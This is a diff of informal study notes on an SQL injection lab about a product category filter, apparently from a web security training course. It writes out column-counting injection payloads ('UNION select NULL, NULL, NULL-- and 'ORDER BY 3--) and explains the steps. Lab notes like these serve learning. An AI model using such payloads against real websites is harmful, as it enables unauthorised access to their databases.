@@ -1,4 +1,9 @@
-SQLi - Product category filter
+# SQLi - Product category filter
+# PRACTITIONER
+
+# FIND THE NUMBER OF COLUMNS
+# Final PAYLOAD = 'UNION select NULL, NULL, NULL--
+# Final PAYLOAD = 'ORDER BY 3--
 
 # STEP 1
 Determind the number of columns return by the query
@@ -55,6 +60,3 @@ select ? form table1 ORDER BY 4--
 error == imposible to order it by 4
 
 So 3 is the number of columns in the first table
-
-Final PAYLOAD = 'UNION select NULL, NULL, NULL--
-Final PAYLOAD = 'ORDER BY 3--
